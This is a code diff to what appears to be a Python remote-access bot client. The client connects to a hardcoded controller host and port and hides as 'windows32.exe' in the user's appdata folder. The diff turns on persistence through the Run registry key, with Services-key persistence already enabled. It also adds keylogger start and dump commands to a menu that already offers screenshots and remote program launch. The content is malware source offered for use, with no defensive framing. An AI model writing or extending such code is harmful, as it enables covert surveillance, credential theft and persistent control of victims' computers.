@@ -18,7 +18,7 @@ HOST = '192.168.0.94'
 PORT = 54321
 pers_loc = os.environ['appdata'] + '\\Microsoft\\Windows\\System32\\windows32.exe'
 keylogger_path = os.environ['appdata'] + '\\processmanager.bin'
-persist_run = False     # Implements persistence through RUN registry key - User Permissions
+persist_run = True     # Implements persistence through RUN registry key - User Permissions
 persist_srv = True      # Implements persistence through Services registry key - NT Authority/System permissions
 persist_stu = False      # Implements persistence through Start Up user folder - User permissions
 isimage = False         # Will open an image the first time it executes itself
@@ -37,6 +37,8 @@ OPTIONS:
     screenshot      --> takes a screenshot from the host and sends to the bot controller
     isadmin         --> check for administrator rights on the bot host
     start <path>    --> starts the app in the remote host
+    keylog_start    --> starts the keylogger
+    keylog_dump     --> dumps the content collected by the keylogger
     q               --> quit
     
 #########################################################################################
@@ -225,4 +227,6 @@ def client():
             shell(s)
 
 
-client()
+if __name__ == '__main__':
+    client()
+
